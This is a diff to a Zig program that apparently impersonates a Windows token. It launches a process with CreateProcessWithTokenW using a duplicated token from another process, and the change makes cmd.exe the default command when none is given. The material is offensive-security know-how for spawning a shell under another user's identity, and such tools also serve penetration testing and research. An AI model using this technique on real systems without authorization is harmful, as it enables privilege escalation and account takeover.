@@ -227,33 +227,31 @@ const Action = struct {
             return false;
         }
 
-        if (self.command.len > 0) {
-            std.log.debug("[+] CreateProcessWithTokenW({s})", .{self.command});
-            const lpApplicationName = std.unicode.utf8ToUtf16LeWithNull(self.allocator, self.command) catch undefined;
-            defer self.allocator.free(lpApplicationName);
+        std.log.debug("[+] CreateProcessWithTokenW({s})", .{self.command});
+        const lpApplicationName = std.unicode.utf8ToUtf16LeWithNull(self.allocator, self.command) catch undefined;
+        errdefer self.allocator.free(lpApplicationName);
 
-            // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
-            if (0 == win32.CreateProcessWithTokenW(
-                self.targetDuplicateProcessToken, //[in]                HANDLE                hToken,
-                win32.LOGON_WITH_PROFILE, //        [in]                DWORD                 dwLogonFlags,
-                lpApplicationName, //               [in, optional]      LPCWSTR               lpApplicationName,
-                null, //                            [in, out, optional] LPWSTR                lpCommandLine,
-                0, //                               [in]                DWORD                 dwCreationFlags,
-                null, //                            [in, optional]      LPVOID                lpEnvironment,
-                null, //                            [in, optional]      LPCWSTR               lpCurrentDirectory,
-                &startupInfo, //                    [in]                LPSTARTUPINFOW        lpStartupInfo,
-                &processInformation, //             [out]               LPPROCESS_INFORMATION lpProcessInformation
-            )) {
-                std.log.err("[!] Failed CreateProcessWithTokenW :: {s} error code ({d})", .{ self.command, @intFromEnum(win32.GetLastError()) });
-                return false;
-            }
+        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
+        if (0 == win32.CreateProcessWithTokenW(
+            self.targetDuplicateProcessToken, //[in]                HANDLE                hToken,
+            win32.LOGON_WITH_PROFILE, //        [in]                DWORD                 dwLogonFlags,
+            lpApplicationName, //               [in, optional]      LPCWSTR               lpApplicationName,
+            null, //                            [in, out, optional] LPWSTR                lpCommandLine,
+            0, //                               [in]                DWORD                 dwCreationFlags,
+            null, //                            [in, optional]      LPVOID                lpEnvironment,
+            null, //                            [in, optional]      LPCWSTR               lpCurrentDirectory,
+            &startupInfo, //                    [in]                LPSTARTUPINFOW        lpStartupInfo,
+            &processInformation, //             [out]               LPPROCESS_INFORMATION lpProcessInformation
+        )) {
+            std.log.err("[!] Failed CreateProcessWithTokenW :: {s} error code ({d})", .{ self.command, @intFromEnum(win32.GetLastError()) });
+            return false;
+        }
 
-            result = @intFromEnum(win32.GetLastError());
+        result = @intFromEnum(win32.GetLastError());
 
-            if (result != 0) {
-                std.log.err("[!] Failed CreateProcessWithTokenW :: error code ({d})", .{result});
-                return false;
-            }
+        if (result != 0) {
+            std.log.err("[!] Failed CreateProcessWithTokenW :: error code ({d})", .{result});
+            return false;
         }
 
         return true;
@@ -336,7 +334,7 @@ const Action = struct {
     }
 
     pub fn parseCommand(self: *Self, line: []u8) !void {
-        self.command = std.fmt.allocPrintZ(self.allocator, "{s}", .{line}) catch undefined;
+        self.command = std.fmt.allocPrint(self.allocator, "{s}", .{line}) catch undefined;
     }
 
     pub fn deinit(self: *Self) void {
@@ -415,8 +413,15 @@ pub fn main() !void {
         i += 1;
     }
 
-    // TODO: check that lpApplicationName actually exists...
-    std.log.info("[+] lpApplicationName exists!", .{});
+    if (action.command.len <= 0) {
+        action.command = std.fmt.allocPrint(action.allocator, "{s}", .{"C:\\windows\\system32\\cmd.exe"}) catch undefined;
+    }
+
+    const file = std.fs.openFileAbsolute(action.command, .{}) catch {
+        std.log.err("[!] Failed to open {s}\n", .{action.command});
+        return;
+    };
+    file.close();
 
     action.debug();
 
